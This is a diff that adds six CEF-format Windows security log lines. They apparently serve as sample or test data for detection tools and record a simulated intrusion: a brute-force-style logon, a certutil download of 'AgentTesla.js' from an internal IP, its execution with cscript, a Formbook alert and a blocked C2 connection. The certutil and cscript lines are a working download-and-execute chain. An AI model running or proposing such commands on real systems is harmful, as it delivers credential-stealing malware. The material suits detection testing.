@@ -1,0 +1,6 @@
+Mar 24 11:50:00 WIN10-8YB72USR CEF:0|Microsoft|Windows|10.0|4625|Account Logon Failed|5|src=192.168.137.78 suser=ADMIN cs2=NTLM cs3=3
+Mar 24 11:52:00 WIN10-8YB72USR CEF:0|Microsoft|Windows|10.0|4624|Account Logon|7|src=192.168.137.78 suser=ADMINZERO cs2=NTLM cs3=3
+Mar 24 12:51:19 WIN10-8YB72USR CEF:0|Microsoft|Windows|10.0|4688|Process Create|9|src=192.168.1.24 sproc=certutil.exe cs1="certutil -urlcache -f http://192.168.137.78/AgentTesla.js C:\Users\Public\Downloads\AgentTesla.js"
+Mar 24 12:52:10 WIN10-8YB72USR CEF:0|Microsoft|Windows|10.0|4688|Process Create|9|src=192.168.1.24 sproc=cmd.exe cs1="cscript.exe C:\Users\Public\Downloads\AgentTesla.js"
+Mar 24 12:53:05 WIN10-8YB72USR CEF:0|CrowdStrike|Falcon|1.0|ProcessLaunch|Malware Execution|10|src=192.168.1.24 sproc=Gift4You.exe cs1="Formbook"
+Mar 24 12:54:12 WIN10-8YB72USR CEF:0|Palo Alto|Firewall|1.0|THREAT|C2 Connection Blocked|9|src=192.168.1.24 dst=13.82.81.180 dpt=80 proto=TCP cs1="Formbook C2"
